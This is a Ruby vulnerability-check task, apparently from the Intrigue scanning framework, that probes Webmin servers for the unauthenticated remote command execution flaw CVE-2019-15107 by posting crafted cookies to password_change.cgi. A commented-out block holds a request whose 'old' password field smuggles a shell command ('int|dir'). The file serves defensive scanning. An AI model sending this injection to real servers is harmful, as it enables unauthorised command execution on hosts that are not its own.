###
### Task is in good shape, just needs some option parsing, and needs to deal with paths
###
module Intrigue
module Task
class  WebminPwreset < BaseTask

  def self.metadata
    {
      :name => "vuln/webmin_pwreset_cve_2019_15107",
      :pretty_name => "Vuln Check - Webmin Password Reset Check",
      :authors => ["jcran","AkkuS <Özkan Mustafa Akkuş>"],
      :identifiers => [{ "cve" =>  "CVE-2019-15107" }],
      :description => "Check for a webmin unauthenticated RCE. Requires a specific configuration, see references.",
      :references => [
        "https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html"
      ],
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super
    
    # check passwd change priv
    url = "#{_get_entity_name}/password_change.cgi"
    cookies = "redirect=1; testing=1; sid=x; sessiontest=1"
    headers = { "Referer" => "#{_get_entity_name}/session_login.cgi", "Cookie" => cookies }
    res = http_request :post, url, nil, headers

    # make sure we got a response
    unless res 
      _log "Not vulnerable, no response!"
      return
    end

    # check to see if we got a failure immediately 
    if res.code == 500 && res.body =~ /Password changing is not enabled/ 
      _log "Not vulnerable, Password changing not enabled!"
      return
    end

    

    ###
    ### TODO ... needs to verify, this has been fixed.
    ###
    # Create as potential
    _create_linked_issue( "vulnerability_webmin_cve_2019_15107") 

    # if we made it this far, try to reset
    #headers = { 'Cookie' => "redirect=1; testing=1; sid=x; sessiontest=1",
    #            'Content-Type'  => 'application/x-www-form-urlencoded',
    #            'Referer' => "#{url}" }
    #data = "user=root&pam=&expired=2&old=int%7cdir%20&new1=asdf&new2=asdf"
    #res = http_request :post, url, nil, headers, data 
    #  
    #if res && res.code == 200 && res.body =~ /password_change.cgi/
    #  _log_good "Vulnerable!"
    #else
    #  _log "Not vulnerable, unable to change pass "
    #end

  end

 
end
end
end
